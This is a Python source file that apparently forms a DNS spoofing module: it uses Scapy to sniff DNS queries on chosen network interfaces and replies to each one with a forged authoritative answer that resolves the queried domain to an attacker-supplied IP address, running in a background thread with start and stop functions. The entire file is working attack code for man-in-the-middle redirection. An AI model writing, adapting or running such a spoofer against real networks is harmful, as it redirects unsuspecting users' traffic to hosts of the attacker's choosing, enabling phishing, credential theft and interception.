from threading import Thread
from scapy.all import *
from scapy.layers.dns import DNSRR, DNS, DNSQR

STOP_SNIFFING = False


def stop_sniff(pkt):
    return STOP_SNIFFING


def sniffer(fakeip, interfaces):
    try:
        pkt = sniff(prn= lambda packet: craft_false_response(packet, fakeip, interfaces),
                    lfilter=lambda packet: packet.haslayer(DNSQR),
                    iface=interfaces,
                    stop_filter=stop_sniff)
    except IndexError as err:
        print(err)
        sniffer(fakeip, interfaces)


def craft_false_response(pkt, fakeip, interfaces):
    domain = pkt[DNS].qd.qname.decode("utf-8")
    # print(domain)
    ip = IP(src=pkt[IP].dst,dst=pkt[IP].src)
    udp = UDP(sport=pkt[UDP].dport,dport=pkt[UDP].sport)
    dns = DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,rd=0,qr=1,qdcount=1,ancount=1,nscount=0,arcount=0,
        ar=DNSRR(rrname=pkt[DNS].qd.qname,type='A',ttl=600,rdata=fakeip))
    response = ip / udp / dns
    for interface in interfaces:
        send(response, verbose=False,iface=interface)
    # print(spoofed_response.summary())
    # print(spoofed_response.show())
    # print(f"Sending {pkt[IP].src} false DNS response: {domain} resolved to {fakeip}\n\n")


def start(fakeip, interfaces):
    dns_thread = Thread(target=sniffer, args=(fakeip, interfaces,))
    dns_thread.daemon = True
    dns_thread.start()


def stop():
    global STOP_SNIFFING
    STOP_SNIFFING = True
